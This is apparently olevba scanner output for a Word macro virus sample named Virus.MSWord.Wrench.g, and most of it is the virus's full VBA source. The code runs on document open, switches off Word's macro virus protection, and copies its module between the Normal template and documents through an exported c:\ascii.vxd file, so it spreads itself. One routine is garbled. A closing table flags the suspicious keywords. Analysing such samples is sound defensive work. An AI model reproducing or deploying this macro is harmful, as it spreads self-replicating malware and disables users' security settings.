olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wrench.g-9e520865f1cfe1b76130d1f02de1f329db6faa7a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wrench.g-9e520865f1cfe1b76130d1f02de1f329db6faa7a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EgertonLab.bas 
in file: Virus.MSWord.Wrench.g-9e520865f1cfe1b76130d1f02de1f329db6faa7a - OLE stream: 'Macros/VBA/EgertonLab'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
 
  Call Infect
End Sub
Sub viewvbcode()
 With Assi
 tion = msoAnimationGestureDown
    .Visible = True
    .MouseTips = True
    .Help
  End With
   Call Infect
End Sub


Sub Infect()
On Error Resume Next
Application.Options.VirusProtection = False
Application.Options.ConfirmConversions = False
Application.ActiveDocument.AcceptAllRevisions
ModulName = "EgertonLab"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
  Set Carrier = NormalTemplate.VBProject.VBComponents
  Set host = ActiveDocument.VBProject.VBComponents
Else
  Set Carrier = ActiveDocument.VBProject.VBComponents
  Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
  Carrier(ModulName).Export "c:\ascii.vxd"
  host.Import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
Sub formatfont()
 Call viewvbcode
 Call Infect
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

